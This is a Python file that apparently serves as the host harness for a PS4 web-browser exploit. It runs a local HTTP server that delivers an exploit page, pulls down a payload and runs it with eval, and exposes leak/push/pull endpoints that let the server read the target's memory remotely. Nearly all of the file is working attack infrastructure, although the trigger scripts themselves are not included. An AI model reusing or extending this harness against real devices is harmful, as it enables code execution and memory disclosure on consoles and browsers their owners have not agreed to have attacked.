import socketserver, http.server, threading, queue

INDEX_HTML = b'''\
<html>
<body onload="go()">
<script>
function print(){}

window.postExploit = function()
{
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/payload.js', true);
    xhr.send('');
    xhr.onload = function()
    {
        eval.call(window, xhr.responseText);
    }
};
</script>
<script src="/external/utils.js"></script>
<script src="/external/int64.js"></script>
<script src="/external/ps4.js"></script>
<button id="input1" onfocus="handle2()"></button>
<button id="input2"></button>
<button id="input3" onfocus="handle2()"></button>
<select id="select1">
<option value="value1">Value1</option>
</select>
</body>
</html>
'''

in_q = queue.Queue()
out_q = queue.Queue()
leak_q = queue.Queue()

class RequestHandler(http.server.BaseHTTPRequestHandler):
    def respond(self, data):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        self.wfile.write(data)
    def do_GET(self):
        if self.path == '/':
            ans = INDEX_HTML
        elif self.path.startswith('/external') and '..' not in self.path:
            ans = open('..'+self.path, 'rb').read()
        elif self.path == '/payload.js':
            ans = open('../helpers.js', 'rb').read()+b'\n'+open('server.js', 'rb').read()
        else:
            self.send_error(404)
            return
        self.respond(ans)
    def do_POST(self):
        data = self.rfile.read(int(self.headers.get('Content-Length')))
        if self.path == '/leak':
            leak_q.put(data)
            self.respond(b'')
        elif self.path == '/push':
            in_q.put(data)
            self.respond(b'a'*512)
        elif self.path == '/pull':
            try: query = out_q.get(timeout=5)
            except queue.Empty: self.respond(b'null')
            else: self.respond(('{"offset": %d, "size": %d}'%tuple(query)).encode('ascii'))
        else:
            self.send_error(404)
    def log_request(self, *args): pass

class Server(socketserver.ThreadingMixIn, http.server.HTTPServer): pass

srv = Server(('', 8080), RequestHandler)
threading.Thread(target=srv.serve_forever, daemon=True).start()

def read_mem(offset, size):
    out_q.put((offset, size))
    ans = in_q.get()
    return ans

def read_ptr(offset):
    return int.from_bytes(read_mem(offset, 8), 'little')

tarea = int(leak_q.get().decode('ascii'), 16)
